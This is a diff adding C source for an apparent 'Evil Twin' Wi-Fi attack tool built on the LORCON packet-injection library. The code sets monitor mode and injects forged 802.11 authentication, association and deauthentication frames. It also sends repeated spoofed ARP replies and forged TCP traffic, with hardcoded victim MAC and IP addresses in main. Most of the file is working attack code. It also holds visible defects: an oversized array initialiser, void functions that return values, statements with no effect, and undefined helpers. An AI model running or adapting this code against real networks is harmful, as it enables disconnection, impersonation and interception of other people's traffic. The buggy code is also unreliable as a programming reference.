+////////////////////////Creating Arp Replay///////////////////////////
+/*************************************************************************/
+void create_arp_rep(u8 *mac1,u8 *mac2,u8 *mac3 ,u8 *src_ip,u8 *trg_ip,lorcon_t *context)
+{
+    struct timeval before , after; 
+    gettimeofday(&before , NULL); 
+    lorcon_packet_t **rx_packet; 
+    lorcon_packet_t *rx_pkt=NULL; 
+    rx_packet=&rx_pkt; 
+    printf ("\n----------------------------");
+	printf("\n[+]\t Sending ARP replay ");
+    u8 broadcast_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff};
+	printf("\n[+]\t Waiting for ARP request ");
+	if(cap_pkt(context,rx_packet,broadcast_mac,7)!=7) 
+         printf("\n[!]\t No ARP request  was not reviced... Abort");
+    int b_indx=0; 
+    u8 qos_pk[62]={0x00};
+    b_indx=add_qos_llc(qos_pk,mac1,mac2,mac3,0x0806);
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x01; 
+    qos_pk[b_indx++]=0x08; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x06;
+    qos_pk[b_indx++]=0x04; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x02; 
+    memcpy(qos_pk+b_indx,mac1,6); 
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,src_ip,4); 
+    b_indx+=4;
+    memcpy(qos_pk+b_indx,mac2,6);
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,trg_ip,4); 
+    b_indx+=4;
+	if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Unable to send ARP replay...Abort");
+		return -1;
+	}
+	if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Unable to send ARP replay...Abort");
+		return -1;
+	}
+	printf("\n[+]\t Arp replay sent ");
+	printf("\n[+]\t Waiting for ACK ");
+	if(cap_pkt(context,rx_packet,mac1,1)!=1)
+         printf("\n[!]\t No Ack Pkt for Arp request Pkt was rnot eviced... Abort");
+    gettimeofday(&after , NULL);
+    printf("\n[+]\t Arp reques/respone took %f sec",time_diff(before , after));
+    return 1;
+}
+/*************************************************************************/
+////////////////////////Creating Arp Replay flood///////////////////////////
+/*************************************************************************/
+void create_arp_rep_flood(u8 *mac1,u8 *mac2,u8 *mac3 ,u8 *src_ip,u8 *trg_ip,lorcon_t *context)
+{
+    struct timeval before , after; 
+    gettimeofday(&before , NULL); 
+    lorcon_packet_t **rx_packet; 
+    lorcon_packet_t *rx_pkt=NULL; 
+    rx_packet=&rx_pkt; 
+    printf ("\n----------------------------");
+	printf("\n[+]\t Sending ARP replay ");
+    u8 broadcast_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff};
+    int b_indx=0; //
+    u8 qos_pk[62]={0x00};
+    b_indx=add_qos_llc(qos_pk,mac1,mac2,mac3,0x0806);
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x01; 
+    qos_pk[b_indx++]=0x08; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x06; 
+    qos_pk[b_indx++]=0x04; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x02; 
+    memcpy(qos_pk+b_indx,mac1,6); 
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,src_ip,4); 
+    b_indx+=4;
+    memcpy(qos_pk+b_indx,mac2,6);
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,trg_ip,4); 
+    b_indx+=4;
+	if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Unable to send ARP replay...Abort");
+		return -1;
+	}
+	printf("\n[+]\t Arp replay sent ");
+	printf("\n[+]\t Waiting for ACK ");
+    gettimeofday(&after , NULL);
+    printf("\n[+]\t Arp reques/respone took %f sec",time_diff(before , after));
+    return 1;
+
+}
+/*************************************************************************/
+                    //Setup Wireless Interface to a ch//
+/*************************************************************************/
+lorcon_t * lorcon2_wifi_setup(char *interface, char *ssid, uint8_t channel)
+  {
+    struct timeval before , after;
+    gettimeofday(&before , NULL); 
+    lorcon_t *context ; 
+    lorcon_driver_t *driver; 
+	if ( (driver = lorcon_auto_driver(interface)) == NULL) {
+
+		printf("\n[!]\t Could not determine the driver for %s\n",interface);
+
+	} else {
+		printf("\n[+]\t Driver: %s is Compatiable",driver->name);
+	       }
+    if ((context = lorcon_create(interface, driver)) == NULL) {
+                printf("\n[!]\t Failed to create context");
+           }
+  	else   {
+		printf("\n[+]\t LorCon Context Was Succefully Created!");
+           }
+    if (lorcon_open_monitor(context) < 0) {
+	 	printf("\n[!]\t Could not create Monitor Mode interface!\n");
+	       }
+	else   {
+	    printf("\n[+]\t WLAN Is In The Monitor Mode !");
+		lorcon_free_driver_list(driver);
+	       }
+    if (lorcon_set_channel(context, channel) < 0) {
+	 	printf("\n[!]\t Couldn't Set Interface to Channel %d!\n", channel);
+	       }
+	else   {
+	    printf("\n[+]\t Now Interface is Ready to Capture and Inject on Channel %d !", channel);
+	       }
+	gettimeofday(&after , NULL);
+    printf("\n[+]\t Config Lorcon2 took %f sec",time_diff(before , after));
+	return context; 
+
+  }
+/*************************************************************************/
+                    //Setup LinuX Wifi Interface//
+/*************************************************************************/
+int setup_linux_interface(char *interface, uint8_t channel)
+    {
+        struct timeval before , after;
+        gettimeofday(&before , NULL); 
+        char buf[200]="";
+        sprintf(buf,"ifconfig %s down",interface);
+            if ( system(buf) < 0 )
+            {
+                printf("\n[!]\t Unable to excute ifconfig...Abort");
+                return -1;
+            }
+            else  printf("\n[+]\t %s",buf);
+        sprintf(buf,"iwconfig %s mode monitor",interface);
+            if ( system(buf) < 0 )
+            {
+                printf("\n[!]\t Unable to excute iwconfig...Abort");
+                return -1;
+            }
+            else  printf("\n[+]\t %s",buf);
+        sprintf(buf,"iwconfig %s channel %d",interface,channel);
+            if ( system(buf) < 0 )
+            {
+                printf("\n[!]\t Unable to excute iwconfig...Abort");
+                return -1;
+            }
+            else  printf("\n[+]\t %s",buf);
+        sprintf(buf,"ifconfig %s up",interface);
+            if ( system(buf) < 0 )
+            {
+                printf("\n[!]\t Unable to excute ifconfig...Abort");
+                return -1;
+            }
+            else  printf("\n[+]\t %s",buf);
+        printf("\n[+]\t Config linux %s was sucesseful",interface);
+
+        gettimeofday(&after , NULL);
+        printf("\n[+]\t Config linux took %f sec",time_diff(before , after));
+    }
+
+/*************************************************************************/
+                        //Authentication Phase//
+/*************************************************************************/
+int authentication_phase(lorcon_t *context,u8 *mac1,u8 *mac2,u8 *mac3)
+    {
+    struct timeval before , after; 
+    gettimeofday(&before , NULL); 
+    lorcon_packet_t **rx_packet; 
+    lorcon_packet_t *rx_pkt=NULL; 
+    rx_packet=&rx_pkt; 
+    printf ("\n----------------------------");
+	printf("\n[+]\t Authentication Phase ");
+	lcpa_metapack_t *metapack1; 
+    lorcon_packet_t *txpack1; 
+	metapack1 = lcpa_init();
+    lcpf_authreq(metapack1,mac2,mac1,mac3,0x00, 0x00, 0x00, 0x00, 0x00, 0x01,0x00);
+	txpack1 = (lorcon_packet_t *) lorcon_packet_from_lcpa(context, metapack1);
+	if ( lorcon_inject(context,txpack1) < 0 )
+	{
+        printf("\n[!]\t Unable to inject auth pkt...Abort");
+		return -1;
+	}
+	if ( lorcon_inject(context,txpack1) < 0 )
+	{
+        printf("\n[!]\t Unable to inject auth pkt...Abort");
+		return -1;
+	}
+	printf("\n[+]\t Authentication sent ");
+	printf("\n[+]\t Waiting for ACK ");
+	if(cap_pkt(context,rx_packet,mac1,1)!=1) 
+         printf("\n[+]\t No Ack Pkt for Auth Pkt was reviced... Abort");
+    lcpa_free(metapack1);
+    gettimeofday(&after , NULL);
+    printf("\n[+]\t Authentication took %f sec",time_diff(before , after));
+
+    return 1;
+    }
+/*************************************************************************/
+                        //De Authentication Phase//
+/*************************************************************************/
+int deauthentication_phase(lorcon_t *context,u8 *mac1,u8 *mac2,u8 *mac3)
+    {
+struct timeval before , after; 
+    gettimeofday(&before , NULL);
+    u8 qos_pk[100]={0x00};
+    int b_indx=0;
+    lorcon_packet_t **rx_packet; 
+    lorcon_packet_t *rx_pkt=NULL; 
+    rx_packet=&rx_pkt; 
+	printf ("\n----------------------------");
+	printf("\n[+]\t De Authentication ");
+    qos_pk[b_indx++]=0xC0;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00;
+    memcpy(qos_pk+b_indx,mac3,6); 
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,mac1,6); 
+    b_indx+=6;
+    memcpy(qos_pk+b_indx,mac2,6); 
+    b_indx+=6;
+    qos_pk[b_indx++]=0x00;
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+    qos_pk[b_indx++]=0x00; 
+	if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Unable to send De auth Request...Abort");
+		return -1;
+	}
+
+	if (lorcon_send_bytes(context, b_indx, qos_pk) < 0 )
+	{
+        printf("\n[!]\t Unable to send De auth Request...Abort");
+		return -1;
+	}
+	printf("\n[+]\t DeAuthentication sent ");
+	printf("\n[+]\t Waiting for ACK ");
+	if(cap_pkt(context,rx_packet,mac1,1)!=1)
+         printf("\n[+]\t No Ack Pkt for DeAuth Pkt was reviced... Abort");
+
+    gettimeofday(&after , NULL);
+    printf("\n[+]\t DeAuthentication took %f sec",time_diff(before , after));
+    return 1;
+    }
+/*************************************************************************/
+                        //Association Phase//
+/*************************************************************************/
+int association_phase(lorcon_t *context,char *ssid,u8 *mac1,u8 *mac2,u8 *mac3)
+{
+struct timeval before , after; 
+gettimeofday(&before , NULL);
+lorcon_packet_t **rx_packet;
+lorcon_packet_t *rx_pkt=NULL; 
+rx_packet=&rx_pkt; 
+printf ("\n----------------------------");
+printf("\n[+]\t Association Phase ");
+uint8_t rates[] = "\x02\x04\x0b\x16\x0c\x12\x18\x24"; 
+uint8_t ex_rates[] = "\x30\x48\x60\x6c"; 
+int capabilities = 0x0421;
+lcpa_metapack_t *metapack1; 
+lorcon_packet_t *txpack1; 
+metapack1 = lcpa_init();
+lcpf_assocreq(metapack1, mac2, mac1, mac3, 0x00, 134, 0x00, 0x01, capabilities, 0x01);
+lcpf_add_ie(metapack1, 0, strlen(ssid),ssid);
+lcpf_add_ie(metapack1, 1, sizeof(rates)-1, rates);
+lcpf_add_ie(metapack1, 50, sizeof(ex_rates)-1, ex_rates);
+uint8_t WMM[]="\x00\x50\xf2\x02\x00\x01\x00";
+txpack1 = (lorcon_packet_t *) lorcon_packet_from_lcpa(context, metapack1);
+if ( lorcon_inject(context,txpack1) < 0 )
+{
+ printf("\n[!]\t Unable to inject association pkt...Abort");
+return -1;
+}
+if ( lorcon_inject(context,txpack1) < 0 )
+{
+ printf("\n[!]\t Unable to inject association pkt...Abort");
+return -1;
+}
+printf("\n[+]\t Association sent ");
+printf("\n[+]\t Waiting for ACK ");
+if(cap_pkt(context,rx_packet,mac1,1)!=1) 
+   printf("\n[!]\t No Ack Pkt for Association Pkt was reviced... Abort");
+lcpa_free(metapack1);
+gettimeofday(&after , NULL);
+printf("\n[+]\t Association took %f sec",time_diff(before , after));
+return 1;
+}
+/*************************************************************************/
+                         //Main Function//
+/*************************************************************************/
+
+int main(void) {
+struct timeval before , after; 
+gettimeofday(&before , NULL); 
+char *interface = "wlan0"; 
+char *ssid = "LAP"; 
+uint8_t channel = atoi("6"); 
+int c,i;
+lorcon_packet_t **rx_packet; 
+lorcon_packet_t *rx_pkt=NULL; 
+rx_packet=&rx_pkt; 
+u8  client_mac[6] = "\x1c\xd0\x05\x05\x00\x03"; 
+u8  dst_mac[6] = "\xc0\x56\x27\xce\xd7\xf2"; 
+u8  bssid_mac[6] = "\xc0\x56\x27\xce\xd7\xf3";
+srand(before.tv_sec);
+int pid =getpid();
+printf("\nEvil Twin Attack On Same ISP");
+printf("\n::::::~~~Server Side~~~::::::");
+printf("\nProgram V2.0\n\n");
+setup_linux_interface(interface,channel);
+lorcon_t *context=lorcon2_wifi_setup(interface,ssid,channel);
+printf ("\n----------------------------");
+print_array("Attcker MAC address is",client_mac,6);
+authentication_phase(context,client_mac,bssid_mac,bssid_mac); 
+association_phase(context,ssid,client_mac,bssid_mac,bssid_mac);
+u8 src_ip[4]= "\xC0\xA8\x02\x73"; 
+u8 gw_ip[4]= "\xC0\xA8\x02\x01"; 
+u8 dst_ip[4]= "\x0A\xAD\xCC\x53"; 
+which_client= 1;
+create_arp_req(client_mac,dst_mac,bssid_mac,src_ip,gw_ip,context);
+create_tcp_3way(client_mac,dst_mac,bssid_mac,src_ip,dst_ip,1234,0000,context);
+printf("\n\t Press any key to recive connection 2");
+keep_src_port=rx_dst_port;
+/*************************************************************************/
+                        //Waiting client two//
+/*************************************************************************/
+u8  client_mac_2[6] = "\x1c\xd0\x05\x05\x00\x03"; 
+u8  dst_mac_2[6] = "\xc0\x56\x27\xce\xd7\xf2";  
+u8  bssid_mac_2[6] ="\xc0\x56\x27\xce\xd7\xf3";
+
+u8 src_ip_2[4]= "\xC0\xA8\x02\x73"; 
+u8 gw_ip_2[4]= "\xC0\xA8\x02\x01"; 
+u8 dst_ip_2[4]= "\x0A\xAD\xCC\x53";
+which_client = 2;
+create_tcp_3way(client_mac_2,dst_mac_2,bssid_mac_2,src_ip_2,dst_ip_2,1234,0000,context);
+data_num=0;
+msg=0x00;
+int j=0;
+int k=0;
+rx_tcp_seq[3];
+tx_tcp_seq[3]++;
+rx_tcp_seq_2[3];
+tx_tcp_seq_2[3]++;
+for (j=0;j<10;++j)
+{
+usleep(200*1000);
+print_array("Distnation 1 IP address",dst_ip,4);
+which_client = 1;
+data_num=1;
+create_tcp_echo(client_mac,dst_mac,bssid_mac,src_ip,dst_ip,1234,rx_dst_port,context);
+create_arp_rep_flood(client_mac,dst_mac,bssid_mac,src_ip,gw_ip_2,context);
+data_num=2;
+create_tcp_echo(client_mac,dst_mac,bssid_mac,src_ip,dst_ip,1234,rx_dst_port,context);
+data_num=3;
+create_tcp_echo(client_mac,dst_mac,bssid_mac,src_ip,dst_ip,1234,rx_dst_port,context);
+create_arp_rep_flood(client_mac,dst_mac,bssid_mac,src_ip,gw_ip_2,context);
+data_num=4;
+create_tcp_echo(client_mac,dst_mac,bssid_mac,src_ip,dst_ip,1234,rx_dst_port,context);
+which_client = 2;
+print_array("Distnation 2 IP address",dst_ip_2,4);
+data_num=5;
+create_tcp_echo(client_mac_2,dst_mac_2,bssid_mac,src_ip_2,dst_ip_2,1234,rx_dst_port_2,context);
+data_num=6;
+create_tcp_echo(client_mac_2,dst_mac_2,bssid_mac,src_ip_2,dst_ip_2,1234,rx_dst_port_2,context);
+data_num=7;
+create_tcp_echo(client_mac_2,dst_mac_2,bssid_mac,src_ip_2,dst_ip_2,1234,rx_dst_port_2,context);
+data_num=8;
+create_tcp_echo(client_mac_2,dst_mac_2,bssid_mac,src_ip_2,dst_ip_2,1234,rx_dst_port_2,context);
+create_arp_rep_flood(client_mac,dst_mac,bssid_mac,src_ip,gw_ip_2,context);
+msg++;
+}
+gettimeofday(&after , NULL);
+printf("\n[+]\t Total titme %f sec",time_diff(before , after));
+printf ("\n----------------------------");
+return 0;
+}
+
